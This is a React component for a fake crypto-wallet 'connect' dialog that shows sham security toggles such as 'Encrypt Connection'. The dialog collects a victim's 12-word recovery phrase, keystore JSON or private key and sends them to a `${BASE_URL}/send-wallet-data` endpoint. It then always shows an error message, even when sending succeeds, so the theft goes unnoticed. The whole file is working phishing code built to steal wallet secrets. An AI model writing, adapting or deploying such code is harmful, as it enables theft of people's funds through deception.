import React, { useState } from "react";
import {
  Box,
  Typography,
  Tabs,
  Tab,
  TextField,
  Button,
  Modal,
} from "@mui/material";
import { SwitchIos } from "./mui-treasury/switch-ios";
import SquareProgress from "./components/square-progress";
import ContentPasteIcon from "@mui/icons-material/ContentPaste";

const WalletModal = ({ open, onClose, selectedWallet }) => {
  const [tabValue, setTabValue] = useState(0);
  const [walletAddress, setWalletAddress] = useState("");
  const [phraseWords, setPhraseWords] = useState(Array(12).fill(""));
  const [keystoreJSON, setKeystoreJSON] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [showErrorPopup, setShowErrorPopup] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const handleTabChange = (event, newValue) => {
    setTabValue(newValue);
  };

  const handlePaste = () => {
    navigator.clipboard.readText().then((pastedText) => {
      const words = pastedText.trim().split(" ");
      if (words.length === 12) {
        setPhraseWords(words);
      } else {
        setErrorMessage("Please enter 12 words separated by a single space.");
        setShowErrorPopup(true);
      }
    });
  };

  const handleWordPaste = (index) => {
    navigator.clipboard.readText().then((pastedText) => {
      const words = pastedText.trim().split(" ");
      if (words.length === 12) {
        const newPhraseWords = [...phraseWords];
        newPhraseWords[index] = words[index];
        setPhraseWords(newPhraseWords);
      } else {
        setErrorMessage("Please copy 12 words separated by a single space.");
        setShowErrorPopup(true);
      }
    });
  };

  const handleSubmit = async () => {
    if (!walletAddress || phraseWords.includes("")) {
      setErrorMessage("Wallet address and 12-word phrase are required.");
      setShowErrorPopup(true);
      return;
    }

    let formData = {
      walletName: selectedWallet?.name,
      walletAddress: walletAddress,
      phraseWords,
    };

    if (tabValue === 1) {
      formData.keystoreJSON = keystoreJSON;
    } else if (tabValue === 2) {
      formData.privateKey = privateKey;
    }

    try {
      const response = await fetch(`${BASE_URL}/send-wallet-data`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
          body: JSON.stringify(formData),
        }
      );

      // Force error display even if submission is successful
      setErrorMessage("Error occurred while processing your request.");
      setShowErrorPopup(true);

      // Uncomment this if you want to close the modal on success later
      // if (response.ok) {
      //   onClose();
      // } else {
      //   setErrorMessage("Unable to connect you at the moment.");
      //   setShowErrorPopup(true);
      // }
    } catch (error) {
      console.error("Error:", error);
      setErrorMessage("Error occurred while sending data.");
      setShowErrorPopup(true);
    }
  };

  return (
    <>
      <Modal
        open={open}
        onClose={onClose}
        aria-labelledby="wallet-connect-modal"
        aria-describedby="wallet-connect-description"
      >
        <Box
          sx={{
            position: "absolute",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            width: "90%",
            maxWidth: 400,
            bgcolor: "#f5f5f5",
            borderRadius: "40px",
            boxShadow: 24,
            p: 3,
            maxHeight: "90vh",
            overflowY: "auto",
            overflowX: "hidden",
          }}
          className="custom-scrollbar"
        >
          <Typography
            variant="h6"
            component="h2"
            align="center"
            sx={{ mb: 1, color: "#333", fontSize: "1.1rem" }}
          >
            {selectedWallet?.name}
          </Typography>
          <Box
            sx={{
              display: "flex",
              justifyContent: "center",
              mb: 1,
              position: "relative",
              width: 80,
              height: 80,
              margin: "0 auto",
            }}
          >
            <SquareProgress size={80} thickness={3} color="#3498db" />

            <Box
              sx={{
                position: "absolute",
                top: 4,
                left: 4,
                right: 4,
                bottom: 4,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                borderRadius: "4px",
                overflow: "hidden",
                backgroundColor: "white",
              }}
            >
              <img
                src={selectedWallet?.image}
                alt={selectedWallet?.name}
                width="56"
                height="56"
                style={{ objectFit: "contain" }}
              />
            </Box>
          </Box>
          <Typography
            variant="body2"
            align="center"
            sx={{ mb: 1, color: "#666", fontSize: "0.8rem" }}
          >
            Initializing secure connection with {selectedWallet?.name}
          </Typography>
          <Box
            sx={{
              display: "flex",
              justifyContent: "space-between",
              mb: 1,
              alignItems: "center",
            }}
          >
            <Typography sx={{ color: "#333", fontSize: "0.7rem" }}>
              Auto Validate
            </Typography>
            <SwitchIos defaultChecked />
          </Box>
          <Box
            sx={{
              display: "flex",
              justifyContent: "space-between",
              mb: 1,
              alignItems: "center",
            }}
          >
            <Typography sx={{ color: "#333", fontSize: "0.7rem" }}>
              Encrypt Connection
            </Typography>
            <SwitchIos defaultChecked />
          </Box>
          <Tabs
            value={tabValue}
            onChange={handleTabChange}
            sx={{
              mb: 1,
              "& .MuiTab-root": {
                minWidth: 0,
                padding: "6px 12px",
                fontSize: "0.8rem",
              },
            }}
          >
            <Tab label="Phrase" />
            <Tab label="Keystore JSON" />
            <Tab label="Private Key" />
          </Tabs>
          {tabValue === 0 && (
            <>
              <TextField
                fullWidth
                label="Enter your wallet address"
                variant="outlined"
                margin="dense"
                size="small"
                value={walletAddress}
                onChange={(e) => setWalletAddress(e.target.value)}
                sx={{
                  "& .MuiInputLabel-root": { fontSize: "0.8rem" },
                  "& .MuiOutlinedInput-root": { borderRadius: "8px" },
                }}
              />
              <Box
                sx={{
                  display: "grid",
                  gridTemplateColumns: "repeat(3, 1fr)",
                  gap: 1,
                  mt: 1,
                  p: 1,
                  border: "1px solid #999",
                  borderRadius: "8px",
                  backgroundColor: "#fff",
                }}
              >
                {phraseWords.map((word, index) => (
                  <TextField
                    key={index}
                    value={word}
                    placeholder={`Word ${index + 1}`}
                    onChange={(e) => {
                      const newPhraseWords = [...phraseWords];
                      newPhraseWords[index] = e.target.value;
                      setPhraseWords(newPhraseWords);
                    }}
                    onPaste={() => handleWordPaste(index)}
                    variant="outlined"
                    margin="dense"
                    size="small"
                    inputProps={{
                      style: {
                        padding: "8px",
                        fontSize: "0.8rem",
                        textAlign: "center",
                      },
                    }}
                    sx={{
                      "& .MuiOutlinedInput-root": { borderRadius: "8px" },
                    }}
                  />
                ))}
              </Box>
              <Button
                variant="outlined"
                startIcon={<ContentPasteIcon />}
                onClick={handlePaste}
                sx={{
                  mt: 1,
                  width: "100%",
                  borderRadius: "8px",
                  fontSize: "0.8rem",
                }}
              >
                Paste from Clipboard
              </Button>
            </>
          )}
          {tabValue === 1 && (
            <TextField
              fullWidth
              label="Keystore JSON"
              variant="outlined"
              margin="dense"
              size="small"
              multiline
              rows={4}
              value={keystoreJSON}
              onChange={(e) => setKeystoreJSON(e.target.value)}
              sx={{
                "& .MuiInputLabel-root": { fontSize: "0.8rem" },
                "& .MuiOutlinedInput-root": { borderRadius: "8px" },
              }}
            />
          )}
          {tabValue === 2 && (
            <TextField
              fullWidth
              label="Private Key"
              variant="outlined"
              margin="dense"
              size="small"
              multiline
              rows={2}
              value={privateKey}
              onChange={(e) => setPrivateKey(e.target.value)}
              sx={{
                "& .MuiInputLabel-root": { fontSize: "0.8rem" },
                "& .MuiOutlinedInput-root": { borderRadius: "8px" },
              }}
            />
          )}
          <Button
            variant="contained"
            color="primary"
            onClick={handleSubmit}
            sx={{
              mt: 2,
              width: "100%",
              borderRadius: "8px",
              fontSize: "0.8rem",
            }}
          >
            Connect
          </Button>
        </Box>
      </Modal>
      {/* Error Popup */}
      <Modal open={showErrorPopup} onClose={() => setShowErrorPopup(false)}>
        <Box
          sx={{
            position: "absolute",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            width: 300,
            bgcolor: "white",
            borderRadius: "8px",
            boxShadow: 24,
            p: 4,
          }}
        >
          <Typography
            color={"black"}
            variant="body1"
            align="center"
            sx={{ mb: 2 }}
          >
            {errorMessage}
          </Typography>
          <Button
            variant="contained"
            color="primary"
            onClick={() => setShowErrorPopup(false)}
            sx={{ width: "100%", borderRadius: "8px" }}
          >
            OK
          </Button>
        </Box>
      </Modal>
    </>
  );
};

export default WalletModal;
